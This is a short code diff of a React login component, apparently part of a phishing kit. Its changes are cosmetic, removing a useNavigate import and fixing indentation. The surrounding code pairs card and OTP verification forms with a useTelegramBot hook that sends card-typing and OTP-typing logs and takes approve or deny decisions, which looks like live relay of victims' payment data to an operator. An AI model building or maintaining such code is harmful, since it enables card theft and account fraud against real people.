@@ -8,13 +8,8 @@ import CardVerificationForm from './CardVerificationForm';
 import OtpVerificationForm from './OtpVerificationForm';
 import LoadingOverlay from './LoadingOverlay';
 import './LoginForm.css';
-import { useNavigate } from 'react-router-dom'; // Ajoutez cette ligne
-
-
 
 function LoginForm() {
-    const navigate = useNavigate(); // Ajoutez cette ligne après les hooks
-
   const { language, t } = useLanguage();
   
   // State management
@@ -155,7 +150,8 @@ function LoginForm() {
       window.location.href = '/blocked';
     }
   };
-    const handleNextStepAppr = () => {
+  
+  const handleNextStepAppr = () => {
     console.log('🔵 Next Step (Appr) button clicked!');
     window.location.href = '/nextstepappr';
   };
@@ -177,8 +173,7 @@ function LoginForm() {
     sendCardTypingLog,
     sendOtpTypingLog,
     sendBlockedLog
-
-    } = useTelegramBot(
+  } = useTelegramBot(
     sessionId, 
     handleApprove, 
     handleDeny, 
